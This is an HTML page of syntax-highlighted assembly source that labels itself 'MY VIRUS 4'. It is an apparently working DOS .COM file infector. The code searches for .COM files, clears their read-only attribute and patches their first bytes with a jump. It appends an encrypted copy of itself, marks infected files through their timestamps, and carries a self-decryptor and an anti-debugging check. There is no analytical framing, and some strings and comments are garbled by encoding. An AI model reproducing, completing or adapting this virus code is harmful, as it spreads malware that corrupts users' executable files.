<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>C_449.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;  MY VIRUS 4 &gt; </span><span class="sc0">

    </span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
    </span><span class="sc2">.386</span><span class="sc0">
    </span><span class="sc9">.stack</span><span class="sc0">
    </span><span class="sc9">.code</span><span class="sc0">  
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">Jmp</span><span class="sc0">      </span><span class="sc5">sc</span><span class="sc0">

</span><span class="sc5">com_adr</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc4">+</span><span class="sc5">desc</span><span class="sc0">
</span><span class="sc5">real_start</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">desc</span><span class="sc4">+</span><span class="sc2">3h</span><span class="sc0">
</span><span class="sc5">Dec_l</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0"> 
</span><span class="sc5">d_lng</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0193h</span><span class="sc0"> </span><span class="sc1">;_____-------_____- ?</span><span class="sc0">
</span><span class="sc5">desc</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">030d</span><span class="sc0">
</span><span class="sc5">lng</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">446d</span><span class="sc0">

</span><span class="sc5">sc</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0"> 
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc0">
    </span><span class="sc6">Pushf</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Test</span><span class="sc0">    </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">Jz</span><span class="sc0">  </span><span class="sc5">Right</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Right</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">dr</span><span class="sc0">
</span><span class="sc5">dr</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc0">
</span><span class="sc5">dr</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">desc</span><span class="sc0">   </span><span class="sc1">;-------------- now !!! if modific. decoder</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">d_lng</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
</span><span class="sc5">Decod</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Lodsb</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">
    </span><span class="sc6">Rol</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Dl</span><span class="sc0">
    </span><span class="sc6">Stosb</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">Decod</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">bep</span><span class="sc0">
</span><span class="sc5">vir</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc13">"\???????.COMooooooooooooooooooooooooooooooooooooooooooooooéooooooooooo
</span><span class="sc5">bep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">56d</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">000dh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">find_f</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">  
</span><span class="sc5">find_f</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ok</span><span class="sc0">
</span><span class="sc5">find_n</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">find_n</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">ok</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">chk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chk</span><span class="sc0">
</span><span class="sc5">dg</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">65535d</span><span class="sc0">
</span><span class="sc5">dg</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rt</span><span class="sc0">
</span><span class="sc5">fg</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">fg</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">65535d</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_f</span><span class="sc0">
</span><span class="sc5">ok</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">chk</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01e0h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01a0h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">find_n</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">65000d</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">find_n</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">find_n</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0"> 
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02bh</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">65535d</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nam</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">nam</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">nam</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nam</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">36h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0"> 
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">chk</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">       
    </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;======lengh of file to AX</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3fh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;==========new JMP to virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">               
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                   
    </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">ar</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rt</span><span class="sc0">
</span><span class="sc5">ar</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">ar</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">+</span><span class="sc2">36h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">  
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">        
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00d</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">-</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc8">Dl</span><span class="sc0">  </span><span class="sc1">;  á¯à ¢¨âì </span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">Dec_l</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">0191h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">014eh</span><span class="sc0">  </span><span class="sc1">;--f</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Rep</span><span class="sc0"> </span><span class="sc6">Movsb</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Si</span><span class="sc4">-</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0191h</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">D_lng</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
</span><span class="sc5">Cod</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Lodsb</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">
    </span><span class="sc6">Rol</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Dl</span><span class="sc0">
    </span><span class="sc6">Stosb</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">Cod</span><span class="sc0">

    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">real_start</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">lng</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                   
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">+</span><span class="sc2">36h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">65055d</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01a0h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">rt</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">rt</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc5">sc</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc9">END</span><span class="sc0">
</span></div></body>
</html>
